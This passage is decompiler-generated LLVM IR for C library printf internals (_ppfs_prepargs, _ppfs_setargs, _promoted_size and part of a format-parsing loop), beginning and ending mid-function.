  %v3_c5844 = zext i8 %v2_c5843 to i32
  store i32 %v3_c5844, i32* %r0.global-to-local, align 4
  %v2_c5885 = icmp eq i8 %v2_c5843, 0
  br i1 %v2_c5885, label %dec_label_pc_c590, label %dec_label_pc_c54c

dec_label_pc_c54c:                                ; preds = %dec_label_pc_c544, %dec_label_pc_c584.backedge
  %v0_c554 = phi i32 [ %storemerge, %dec_label_pc_c584.backedge ], [ %v0_c544, %dec_label_pc_c544 ]
  %v0_c54c = phi i32 [ %v3_c584, %dec_label_pc_c584.backedge ], [ %v3_c5844, %dec_label_pc_c544 ]
  %v7_c54c = icmp eq i32 %v0_c54c, 37
  br i1 %v7_c54c, label %dec_label_pc_c554, label %dec_label_pc_c580

dec_label_pc_c554:                                ; preds = %dec_label_pc_c54c
  %v1_c554 = add i32 %v0_c554, 1
  %v2_c554 = inttoptr i32 %v1_c554 to i8*
  %v3_c554 = load i8, i8* %v2_c554, align 1
  %v4_c554 = zext i8 %v3_c554 to i32
  store i32 %v4_c554, i32* %r3.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v7_c558 = icmp eq i8 %v3_c554, 37
  br i1 %v7_c558, label %dec_label_pc_c580, label %dec_label_pc_c560

dec_label_pc_c560:                                ; preds = %dec_label_pc_c554
  %v1_c560 = load i32, i32* @r4, align 4
  %v2_c560 = inttoptr i32 %v1_c560 to i32*
  store i32 %v1_c554, i32* %v2_c560, align 4
  %v0_c564 = load i32, i32* @r4, align 4
  store i32 %v0_c564, i32* %r0.global-to-local, align 4
  %v1_c568 = inttoptr i32 %v0_c564 to i8*
  %v2_c568 = call i32 @_ppfs_parsespec(i8* %v1_c568)
  store i32 %v2_c568, i32* %r0.global-to-local, align 4
  %v1_c56c = icmp slt i32 %v2_c568, 0
  br i1 %v1_c56c, label %dec_label_pc_c594.loopexit, label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_c560
  %v0_c578 = load i32, i32* @r4, align 4
  %v1_c578 = inttoptr i32 %v0_c578 to i32*
  %v2_c578 = load i32, i32* %v1_c578, align 4
  br label %dec_label_pc_c584.backedge

dec_label_pc_c580:                                ; preds = %dec_label_pc_c54c, %dec_label_pc_c554
  %v0_c580 = phi i32 [ %v0_c554, %dec_label_pc_c54c ], [ %v1_c554, %dec_label_pc_c554 ]
  %v1_c580 = add i32 %v0_c580, 1
  br label %dec_label_pc_c584.backedge

dec_label_pc_c584.backedge:                       ; preds = %dec_label_pc_c580, %dec_label_pc_c578
  %storemerge = phi i32 [ %v1_c580, %dec_label_pc_c580 ], [ %v2_c578, %dec_label_pc_c578 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_c584 = inttoptr i32 %storemerge to i8*
  %v2_c584 = load i8, i8* %v1_c584, align 1
  %v3_c584 = zext i8 %v2_c584 to i32
  store i32 %v3_c584, i32* %r0.global-to-local, align 4
  %v2_c588 = icmp eq i8 %v2_c584, 0
  br i1 %v2_c588, label %dec_label_pc_c584.dec_label_pc_c590_crit_edge, label %dec_label_pc_c54c

dec_label_pc_c584.dec_label_pc_c590_crit_edge:    ; preds = %dec_label_pc_c584.backedge
  %v0_c590.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c590

dec_label_pc_c590:                                ; preds = %dec_label_pc_c584.dec_label_pc_c590_crit_edge, %dec_label_pc_c544
  %v0_c590 = phi i32 [ %v0_c590.pre, %dec_label_pc_c584.dec_label_pc_c590_crit_edge ], [ %v0_c544, %dec_label_pc_c544 ]
  %v1_c590 = load i32, i32* @r4, align 4
  %v2_c590 = inttoptr i32 %v1_c590 to i32*
  store i32 %v0_c590, i32* %v2_c590, align 4
  %v1_c59c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c594

dec_label_pc_c594.loopexit:                       ; preds = %dec_label_pc_c560
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c594

dec_label_pc_c594:                                ; preds = %dec_label_pc_c594.loopexit, %dec_label_pc_c590
  %v1_c59c = phi i32 [ -1, %dec_label_pc_c594.loopexit ], [ %v1_c59c.pre, %dec_label_pc_c590 ]
  store i32 %v3_c500, i32* @r4, align 4
  store i32 %v6_c500, i32* @r5, align 4
  ret i32 %v1_c59c

; uselistorder directives
  uselistorder i32 %v3_c584, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_c544, { 1, 0, 2, 3 }
  uselistorder i32 %v4_c53c, { 1, 0 }
  uselistorder i32 %v0_c538.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_c580, { 1, 0 }
  uselistorder label %dec_label_pc_c54c, { 1, 0 }
  uselistorder label %dec_label_pc_c538.dec_label_pc_c538_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_c5a0 = load i32, i32* @r4, align 4
  store i32 %v3_c5a0, i32* %stack_var_-12, align 4
  %v0_c5a4 = load i32, i32* @r0, align 4
  %v1_c5a4 = add i32 %v0_c5a4, 24
  %v2_c5a4 = inttoptr i32 %v1_c5a4 to i32*
  %v3_c5a4 = load i32, i32* %v2_c5a4, align 4
  store i32 %v3_c5a4, i32* %r5.global-to-local, align 4
  store i32 %v0_c5a4, i32* @r4, align 4
  %v2_c5b4 = add i32 %v0_c5a4, 76
  %v3_c5b4 = inttoptr i32 %v2_c5b4 to i32*
  store i32 %arg2, i32* %v3_c5b4, align 4
  %tmp5 = icmp slt i32 %v3_c5a4, 1
  br i1 %tmp5, label %dec_label_pc_c5d8, label %dec_label_pc_c5bc

dec_label_pc_c5bc:                                ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c5c0 = load i32, i32* @r0, align 4
  %v2_c5c0 = add i32 %v1_c5c0, 8
  %v3_c5c0 = inttoptr i32 %v2_c5c0 to i32*
  store i32 0, i32* %v3_c5c0, align 4
  %v0_c5c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_c5c4 = load i32, i32* @r0, align 4
  %v2_c5c4 = add i32 %v1_c5c4, 28
  %v3_c5c4 = inttoptr i32 %v2_c5c4 to i32*
  store i32 %v0_c5c4, i32* %v3_c5c4, align 4
  %v0_c5c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5c8 = load i32, i32* @r0, align 4
  %v2_c5c8 = add i32 %v1_c5c8, 24
  %v3_c5c8 = inttoptr i32 %v2_c5c8 to i32*
  store i32 %v0_c5c8, i32* %v3_c5c8, align 4
  %v0_c5cc = load i32, i32* %r3.global-to-local, align 4
  %v1_c5cc = load i32, i32* @r0, align 4
  %v2_c5cc = add i32 %v1_c5cc, 4
  %v3_c5cc = inttoptr i32 %v2_c5cc to i32*
  store i32 %v0_c5cc, i32* %v3_c5cc, align 4
  %v0_c5d0 = call i32 @_ppfs_setargs()
  store i32 %v0_c5d0, i32* @r0, align 4
  %v0_c5d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_c5d4 = load i32, i32* @r4, align 4
  %v2_c5d4 = add i32 %v1_c5d4, 24
  %v3_c5d4 = inttoptr i32 %v2_c5d4 to i32*
  store i32 %v0_c5d4, i32* %v3_c5d4, align 4
  br label %dec_label_pc_c5d8

dec_label_pc_c5d8:                                ; preds = %entry, %dec_label_pc_c5bc
  %v2_c5dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c5dc, i32* @r4, align 4
  %v1_c5e0 = load i32, i32* @r0, align 4
  ret i32 %v1_c5e0

; uselistorder directives
  uselistorder i32 %v0_c5a4, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_c5d8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_c5e4 = load i32, i32* @r0, align 4
  %v1_c5e4 = add i32 %v0_c5e4, 24
  %v2_c5e4 = inttoptr i32 %v1_c5e4 to i32*
  %v3_c5e4 = load i32, i32* %v2_c5e4, align 4
  store i32 %v3_c5e4, i32* %r1.global-to-local, align 4
  %v2_c5e8 = icmp eq i32 %v3_c5e4, 0
  %v3_c5ec = load i32, i32* @r4, align 4
  store i32 %v3_c5ec, i32* %stack_var_-8, align 4
  %v1_c5f0 = add i32 %v0_c5e4, 8
  %v2_c5f0 = inttoptr i32 %v1_c5f0 to i32*
  %v3_c5f0 = load i32, i32* %v2_c5f0, align 4
  store i32 %v3_c5f0, i32* %r3.global-to-local, align 4
  %v6_c5f8 = icmp eq i32 %v3_c5f0, -2147483648
  br i1 %v2_c5e8, label %dec_label_pc_c5f8, label %dec_label_pc_c730

dec_label_pc_c5f8:                                ; preds = %entry
  br i1 %v6_c5f8, label %dec_label_pc_c600, label %dec_label_pc_c618

dec_label_pc_c600:                                ; preds = %dec_label_pc_c5f8
  %v1_c600 = add i32 %v0_c5e4, 76
  %v2_c600 = inttoptr i32 %v1_c600 to i32*
  %v3_c600 = load i32, i32* %v2_c600, align 4
  store i32 %v3_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = inttoptr i32 %v3_c600 to i32*
  %v2_c604 = load i32, i32* %v1_c604, align 4
  store i32 %v2_c604, i32* %r2.global-to-local, align 4
  %v1_c608 = add i32 %v3_c600, 4
  store i32 %v1_c608, i32* %r3.global-to-local, align 4
  store i32 %v1_c608, i32* %v2_c600, align 4
  %v0_c610 = load i32, i32* %r2.global-to-local, align 4
  %v1_c610 = load i32, i32* @r0, align 4
  %v2_c610 = add i32 %v1_c610, 8
  %v3_c610 = inttoptr i32 %v2_c610 to i32*
  store i32 %v0_c610, i32* %v3_c610, align 4
  %v0_c614 = load i32, i32* %r2.global-to-local, align 4
  %v1_c614 = load i32, i32* @r0, align 4
  %v2_c614 = add i32 %v1_c614, 80
  %v3_c614 = inttoptr i32 %v2_c614 to i32*
  store i32 %v0_c614, i32* %v3_c614, align 4
  %v0_c618.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c618

dec_label_pc_c618:                                ; preds = %dec_label_pc_c5f8, %dec_label_pc_c600
  %v1_c634 = phi i32 [ %v0_c5e4, %dec_label_pc_c5f8 ], [ %v0_c618.pre, %dec_label_pc_c600 ]
  %v1_c618 = add i32 %v1_c634, 4
  %v2_c618 = inttoptr i32 %v1_c618 to i32*
  %v3_c618 = load i32, i32* %v2_c618, align 4
  store i32 %v3_c618, i32* %r3.global-to-local, align 4
  %v6_c61c = icmp eq i32 %v3_c618, -2147483648
  %v1_c620 = add i32 %v1_c634, 80
  store i32 %v1_c620, i32* %ip.global-to-local, align 4
  br i1 %v6_c61c, label %dec_label_pc_c628, label %dec_label_pc_c640

dec_label_pc_c628:                                ; preds = %dec_label_pc_c618
  %v1_c628 = add i32 %v1_c634, 76
  %v2_c628 = inttoptr i32 %v1_c628 to i32*
  %v3_c628 = load i32, i32* %v2_c628, align 4
  store i32 %v3_c628, i32* %r3.global-to-local, align 4
  %v1_c62c = inttoptr i32 %v3_c628 to i32*
  %v2_c62c = load i32, i32* %v1_c62c, align 4
  store i32 %v2_c62c, i32* %r2.global-to-local, align 4
  %v1_c630 = add i32 %v3_c628, 4
  store i32 %v1_c630, i32* %r3.global-to-local, align 4
  store i32 %v1_c630, i32* %v2_c628, align 4
  %v0_c638 = load i32, i32* %r2.global-to-local, align 4
  %v1_c638 = load i32, i32* @r0, align 4
  %v2_c638 = add i32 %v1_c638, 4
  %v3_c638 = inttoptr i32 %v2_c638 to i32*
  store i32 %v0_c638, i32* %v3_c638, align 4
  %v0_c63c = load i32, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* @r0, align 4
  %v2_c63c = add i32 %v1_c63c, 80
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c63c, i32* %v3_c63c, align 4
  %v0_c72017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c640

dec_label_pc_c640:                                ; preds = %dec_label_pc_c618, %dec_label_pc_c628
  %v0_c72017 = phi i32 [ %v1_c634, %dec_label_pc_c618 ], [ %v0_c72017.pre, %dec_label_pc_c628 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_c644 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_c644, i32* %lr.global-to-local, align 4
  %v1_c72018 = add i32 %v0_c72017, 28
  %v2_c72019 = inttoptr i32 %v1_c72018 to i32*
  %v3_c72020 = load i32, i32* %v2_c72019, align 4
  store i32 %v3_c72020, i32* %r3.global-to-local, align 4
  %v5_c72822 = icmp slt i32 %v0_c644, %v3_c72020
  br i1 %v5_c72822, label %dec_label_pc_c64c, label %dec_label_pc_c72c.loopexit

dec_label_pc_c64c:                                ; preds = %dec_label_pc_c640, %dec_label_pc_c720.backedge
  %v0_c72024 = phi i32 [ %v0_c720, %dec_label_pc_c720.backedge ], [ %v0_c72017, %dec_label_pc_c640 ]
  %v0_c65823 = phi i32 [ %v0_c658.be, %dec_label_pc_c720.backedge ], [ %v0_c644, %dec_label_pc_c640 ]
  %v4_c64c = mul i32 %v0_c65823, 4
  %v5_c64c = add i32 %v4_c64c, %v0_c72024
  store i32 %v5_c64c, i32* %r3.global-to-local, align 4
  %v1_c650 = add i32 %v5_c64c, 40
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v7_c654 = icmp eq i32 %v3_c650, 8
  %v1_c658 = add i32 %v0_c65823, 1
  store i32 %v1_c658, i32* %lr.global-to-local, align 4
  br i1 %v7_c654, label %dec_label_pc_c720.backedge, label %dec_label_pc_c660

dec_label_pc_c660:                                ; preds = %dec_label_pc_c64c
  %v1_c660 = add i32 %v0_c72024, 76
  %v2_c660 = inttoptr i32 %v1_c660 to i32*
  %v3_c660 = load i32, i32* %v2_c660, align 4
  store i32 %v3_c660, i32* %r1.global-to-local, align 4
  %v8_c664 = icmp sgt i32 %v3_c650, 8
  br i1 %v8_c664, label %dec_label_pc_c688, label %dec_label_pc_c668

dec_label_pc_c668:                                ; preds = %dec_label_pc_c660
  %v7_c668 = icmp eq i32 %v3_c650, 2
  br i1 %v7_c668, label %dec_label_pc_c6d8, label %dec_label_pc_c670

dec_label_pc_c670:                                ; preds = %dec_label_pc_c668
  %v8_c670 = icmp sgt i32 %v3_c650, 2
  br i1 %v8_c670, label %dec_label_pc_c680, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c670
  %v1_c674 = icmp slt i32 %v3_c650, 0
  br i1 %v1_c674, label %dec_label_pc_c70c, label %dec_label_pc_c6d8

dec_label_pc_c680:                                ; preds = %dec_label_pc_c670
  %v7_c680 = icmp eq i32 %v3_c650, 7
  br i1 %v7_c680, label %dec_label_pc_c6ec, label %dec_label_pc_c70c

dec_label_pc_c688:                                ; preds = %dec_label_pc_c660
  %v7_c688 = icmp eq i32 %v3_c650, 1024
  br i1 %v7_c688, label %dec_label_pc_c6d8, label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %dec_label_pc_c688
  %v8_c690 = icmp sgt i32 %v3_c650, 1024
  br i1 %v8_c690, label %dec_label_pc_c6a8, label %dec_label_pc_c694

dec_label_pc_c694:                                ; preds = %dec_label_pc_c690
  switch i32 %v3_c650, label %dec_label_pc_c70c [
    i32 256, label %dec_label_pc_c6d8
    i32 512, label %dec_label_pc_c6d8
  ]

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c690
  %v7_c6a8 = icmp eq i32 %v3_c650, 2048
  br i1 %v7_c6a8, label %dec_label_pc_c6bc, label %dec_label_pc_c6b4

dec_label_pc_c6b4:                                ; preds = %dec_label_pc_c6a8
  %v1_c6b0 = load i32, i32* %r4.global-to-local, align 4
  %v9_c6b0 = icmp eq i32 %v3_c650, %v1_c6b0
  br i1 %v9_c6b0, label %dec_label_pc_c6ec, label %dec_label_pc_c70c

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6a8
  %v1_c6bc = add i32 %v3_c660, 7
  %v1_c6c0 = and i32 %v1_c6bc, -8
  store i32 %v1_c6c0, i32* %r3.global-to-local, align 4
  %v1_c6c4 = inttoptr i32 %v1_c6c0 to i32*
  %v2_c6c4 = load i32, i32* %v1_c6c4, align 8
  store i32 %v2_c6c4, i32* %r1.global-to-local, align 4
  %v3_c6c4 = or i32 %v1_c6c0, 4
  %v4_c6c4 = inttoptr i32 %v3_c6c4 to i32*
  %v5_c6c4 = load i32, i32* %v4_c6c4, align 4
  store i32 %v5_c6c4, i32* %r2.global-to-local, align 4
  %v1_c6c8 = add i32 %v1_c6c0, 8
  store i32 %v1_c6c8, i32* %r3.global-to-local, align 4
  store i32 %v1_c6c8, i32* %v2_c660, align 4
  %v0_c6d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_c6d0 = inttoptr i32 %v0_c6d0 to i32*
  %v2_c6d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c6d0, i32* %v1_c6d0, align 4
  %v3_c6d0 = add i32 %v0_c6d0, 4
  %v4_c6d0 = inttoptr i32 %v3_c6d0 to i32*
  %v5_c6d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_c6d0, i32* %v4_c6d0, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c6d8:                                ; preds = %dec_label_pc_c694, %dec_label_pc_c694, %dec_label_pc_c674, %dec_label_pc_c688, %dec_label_pc_c668
  %v1_c6d8 = inttoptr i32 %v3_c660 to i32*
  %v2_c6d8 = load i32, i32* %v1_c6d8, align 4
  store i32 %v2_c6d8, i32* %r2.global-to-local, align 4
  %v1_c6dc = add i32 %v3_c660, 4
  store i32 %v1_c6dc, i32* %r3.global-to-local, align 4
  store i32 %v1_c6dc, i32* %v2_c660, align 4
  %v0_c6e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_c6e4 = inttoptr i32 %v1_c6e4 to i32*
  store i32 %v0_c6e4, i32* %v2_c6e4, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c680, %dec_label_pc_c6b4
  %v3_c6ec = load i32, i32* %v2_c660, align 4
  %v1_c6f0 = add i32 %v3_c6ec, 7
  %v1_c6f4 = and i32 %v1_c6f0, -8
  store i32 %v1_c6f4, i32* %r3.global-to-local, align 4
  %v1_c6f8 = inttoptr i32 %v1_c6f4 to i32*
  %v2_c6f8 = load i32, i32* %v1_c6f8, align 8
  store i32 %v2_c6f8, i32* %r1.global-to-local, align 4
  %v3_c6f8 = or i32 %v1_c6f4, 4
  %v4_c6f8 = inttoptr i32 %v3_c6f8 to i32*
  %v5_c6f8 = load i32, i32* %v4_c6f8, align 4
  store i32 %v5_c6f8, i32* %r2.global-to-local, align 4
  %v1_c6fc = add i32 %v1_c6f4, 8
  store i32 %v1_c6fc, i32* %r3.global-to-local, align 4
  store i32 %v1_c6fc, i32* %v2_c660, align 4
  %v0_c704 = load i32, i32* %ip.global-to-local, align 4
  %v1_c704 = inttoptr i32 %v0_c704 to i32*
  %v2_c704 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c704, i32* %v1_c704, align 4
  %v3_c704 = add i32 %v0_c704, 4
  %v4_c704 = inttoptr i32 %v3_c704 to i32*
  %v5_c704 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_c704, i32* %v4_c704, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c70c:                                ; preds = %dec_label_pc_c694, %dec_label_pc_c680, %dec_label_pc_c674, %dec_label_pc_c6b4
  %v1_c70c = add i32 %v3_c660, 4
  store i32 %v1_c70c, i32* %r3.global-to-local, align 4
  store i32 %v1_c70c, i32* %v2_c660, align 4
  %v0_c714 = load i32, i32* %r1.global-to-local, align 4
  %v1_c714 = inttoptr i32 %v0_c714 to i32*
  %v2_c714 = load i32, i32* %v1_c714, align 4
  store i32 %v2_c714, i32* %r3.global-to-local, align 4
  %v1_c718 = load i32, i32* %ip.global-to-local, align 4
  %v2_c718 = inttoptr i32 %v1_c718 to i32*
  store i32 %v2_c714, i32* %v2_c718, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6ec, %dec_label_pc_c6d8, %dec_label_pc_c6bc, %dec_label_pc_c70c
  %v0_c71c = load i32, i32* %ip.global-to-local, align 4
  %v1_c71c = add i32 %v0_c71c, 8
  store i32 %v1_c71c, i32* %ip.global-to-local, align 4
  %v0_c724.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_c720.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c720.backedge

dec_label_pc_c720.backedge:                       ; preds = %dec_label_pc_c71c, %dec_label_pc_c64c
  %v0_c720 = phi i32 [ %v0_c720.pre, %dec_label_pc_c71c ], [ %v0_c72024, %dec_label_pc_c64c ]
  %v0_c658.be = phi i32 [ %v0_c724.pre.pre, %dec_label_pc_c71c ], [ %v1_c658, %dec_label_pc_c64c ]
  %v1_c720 = add i32 %v0_c720, 28
  %v2_c720 = inttoptr i32 %v1_c720 to i32*
  %v3_c720 = load i32, i32* %v2_c720, align 4
  store i32 %v3_c720, i32* %r3.global-to-local, align 4
  %v5_c728 = icmp slt i32 %v0_c658.be, %v3_c720
  br i1 %v5_c728, label %dec_label_pc_c64c, label %dec_label_pc_c720.dec_label_pc_c72c.loopexit_crit_edge

dec_label_pc_c730:                                ; preds = %entry
  br i1 %v6_c5f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c730
  %v2_c734 = add i32 %v0_c5e4, 36
  %v3_c734 = inttoptr i32 %v2_c734 to i8*
  %v4_c734 = load i8, i8* %v3_c734, align 1
  %v5_c734 = zext i8 %v4_c734 to i32
  %v5_c738 = mul nuw nsw i32 %v5_c734, 8
  %v6_c738 = add i32 %v5_c738, %v0_c5e4
  store i32 %v6_c738, i32* %r3.global-to-local, align 4
  %v2_c73c = add i32 %v6_c738, 72
  %v3_c73c = inttoptr i32 %v2_c73c to i32*
  %v4_c73c = load i32, i32* %v3_c73c, align 4
  store i32 %v4_c73c, i32* %r3.global-to-local, align 4
  store i32 %v4_c73c, i32* %v2_c5f0, align 4
  %v0_c744.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c730, %bb
  %v2_c758 = phi i32 [ %v0_c744.pre, %bb ], [ %v0_c5e4, %dec_label_pc_c730 ]
  %v1_c744 = add i32 %v2_c758, 4
  %v2_c744 = inttoptr i32 %v1_c744 to i32*
  %v3_c744 = load i32, i32* %v2_c744, align 4
  store i32 %v3_c744, i32* %r3.global-to-local, align 4
  %v6_c748 = icmp eq i32 %v3_c744, -2147483648
  br i1 %v6_c748, label %bb16, label %dec_label_pc_c72c

bb16:                                             ; preds = %.thread1
  %v2_c74c = add i32 %v2_c758, 37
  %v3_c74c = inttoptr i32 %v2_c74c to i8*
  %v4_c74c = load i8, i8* %v3_c74c, align 1
  %v5_c74c = zext i8 %v4_c74c to i32
  %v5_c750 = mul nuw nsw i32 %v5_c74c, 8
  %v6_c750 = add i32 %v5_c750, %v2_c758
  store i32 %v6_c750, i32* %r3.global-to-local, align 4
  %v2_c754 = add i32 %v6_c750, 72
  %v3_c754 = inttoptr i32 %v2_c754 to i32*
  %v4_c754 = load i32, i32* %v3_c754, align 4
  store i32 %v4_c754, i32* %r3.global-to-local, align 4
  store i32 %v4_c754, i32* %v2_c744, align 4
  %v0_c75c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c72c

dec_label_pc_c720.dec_label_pc_c72c.loopexit_crit_edge: ; preds = %dec_label_pc_c720.backedge
  br label %dec_label_pc_c72c.loopexit

dec_label_pc_c72c.loopexit:                       ; preds = %dec_label_pc_c720.dec_label_pc_c72c.loopexit_crit_edge, %dec_label_pc_c640
  %v0_c720.lcssa = phi i32 [ %v0_c720, %dec_label_pc_c720.dec_label_pc_c72c.loopexit_crit_edge ], [ %v0_c72017, %dec_label_pc_c640 ]
  br label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c72c.loopexit, %.thread1, %bb16
  %v1_c77c = phi i32 [ %v0_c720.lcssa, %dec_label_pc_c72c.loopexit ], [ %v2_c758, %.thread1 ], [ %v0_c75c.pre, %bb16 ]
  %v1_c75c = add i32 %v1_c77c, 8
  %v2_c75c = inttoptr i32 %v1_c75c to i32*
  %v3_c75c = load i32, i32* %v2_c75c, align 4
  store i32 %v3_c75c, i32* %r1.global-to-local, align 4
  %v1_c760 = icmp slt i32 %v3_c75c, 0
  br i1 %v1_c760, label %dec_label_pc_c768, label %dec_label_pc_c788

dec_label_pc_c768:                                ; preds = %dec_label_pc_c72c
  %v1_c768 = add i32 %v1_c77c, 16
  %v2_c768 = inttoptr i32 %v1_c768 to i32*
  %v3_c768 = load i32, i32* %v2_c768, align 4
  %v1_c770 = sub i32 0, %v3_c75c
  store i32 %v1_c770, i32* %r1.global-to-local, align 4
  %v1_c76c = and i32 %v3_c768, -10
  %v1_c774 = or i32 %v1_c76c, 8
  store i32 %v1_c774, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_c77c = add i32 %v1_c77c, 20
  %v3_c77c = inttoptr i32 %v2_c77c to i32*
  store i32 32, i32* %v3_c77c, align 4
  %v0_c780 = load i32, i32* %r1.global-to-local, align 4
  %v1_c780 = load i32, i32* @r0, align 4
  %v2_c780 = add i32 %v1_c780, 8
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* %r3.global-to-local, align 4
  %v1_c784 = load i32, i32* @r0, align 4
  %v2_c784 = add i32 %v1_c784, 16
  %v3_c784 = inttoptr i32 %v2_c784 to i32*
  store i32 %v0_c784, i32* %v3_c784, align 4
  %v1_c78c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c788

dec_label_pc_c788:                                ; preds = %dec_label_pc_c72c, %dec_label_pc_c768
  %v1_c78c = phi i32 [ %v1_c77c, %dec_label_pc_c72c ], [ %v1_c78c.pre, %dec_label_pc_c768 ]
  %v2_c788 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c788, i32* @r4, align 4
  ret i32 %v1_c78c

; uselistorder directives
  uselistorder i32 %v2_c758, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c658.be, { 1, 0 }
  uselistorder i32 %v0_c720, { 1, 2, 0 }
  uselistorder i32 %v3_c660, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_c660, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_c650, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_c65823, { 1, 0 }
  uselistorder i32 %v0_c72024, { 0, 2, 1 }
  uselistorder i32 %v0_c72017, { 2, 0, 1 }
  uselistorder i32 %v0_c5e4, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_c788, { 1, 0 }
  uselistorder label %dec_label_pc_c72c, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c71c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c70c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c6ec, { 1, 0 }
  uselistorder label %dec_label_pc_c6d8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_c64c, { 1, 0 }
  uselistorder label %dec_label_pc_c640, { 1, 0 }
  uselistorder label %dec_label_pc_c618, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_c7b0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c7ac

dec_label_pc_c7ac:                                ; preds = %dec_label_pc_c7b8, %entry
  %v0_c7ac = phi i32 [ %v1_c7ac, %dec_label_pc_c7b8 ], [ add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38018), %entry ]
  %v1_c7ac = add i32 %v0_c7ac, -2
  %v2_c7ac = inttoptr i32 %v1_c7ac to i16*
  %v3_c7ac = load i16, i16* %v2_c7ac, align 2
  %v4_c7ac = sext i16 %v3_c7ac to i32
  store i32 %v1_c7ac, i32* @ip, align 4
  %v9_c7b0 = icmp eq i32 %v4_c7ac, %v1_c7b0.pre
  br i1 %v9_c7b0, label %dec_label_pc_c7ac.dec_label_pc_c7c0_crit_edge, label %dec_label_pc_c7b8

dec_label_pc_c7ac.dec_label_pc_c7c0_crit_edge:    ; preds = %dec_label_pc_c7ac
  br label %dec_label_pc_c7c0

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c7ac
